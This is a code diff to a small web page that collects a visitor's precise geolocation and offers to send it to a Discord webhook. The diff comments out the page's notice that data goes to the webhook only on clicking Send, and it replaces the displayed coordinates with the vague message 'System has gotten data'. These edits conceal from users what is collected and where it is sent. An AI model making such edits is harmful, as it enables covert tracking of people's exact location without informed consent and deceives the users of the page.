@@ -23,7 +23,7 @@
 <body>
 
   <h2>Get and Send My Data</h2>
-  <p>This tool gets your current Data and sends it to a Discord webhook <strong>only if you click Send</strong>.</p>
+  <!-- <p>This tool gets your current Data and sends it to a Discord webhook <strong>only if you click Send</strong>.</p> -->
   <button onclick="getLocation()">Get Data</button>
   <div id="output">Data not retrieved yet.</div>
   <button id="sendButton" style="display:none;" onclick="sendToDiscord()">Send to Webhook</button>
@@ -44,7 +44,7 @@
       latitude = position.coords.latitude.toFixed(8);
       longitude = position.coords.longitude.toFixed(8);
       document.getElementById("output").textContent = 
-        `Latitude: ${latitude}\nLongitude: ${longitude}`;
+        `System has gotten data`;
       document.getElementById("sendButton").style.display = "inline-block";
     }
 
